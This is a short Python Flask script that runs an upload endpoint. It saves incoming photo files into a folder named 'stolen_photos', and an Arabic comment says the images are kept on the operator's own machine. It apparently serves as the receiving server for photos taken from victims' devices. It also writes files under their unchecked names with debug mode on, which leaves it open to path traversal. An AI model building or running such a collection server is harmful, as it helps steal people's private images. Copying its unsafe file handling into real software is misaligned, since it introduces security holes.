from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'stolen_photos'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'photos' not in request.files:
        return 'No file part', 400
    
    files = request.files.getlist('photos')
    for file in files:
        if file.filename != '':
            # حفظ الصورة في مجلد في جهازك
            file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    
    return 'Received'

if __name__ == '__main__':
    app.run(port=5000, debug=True)
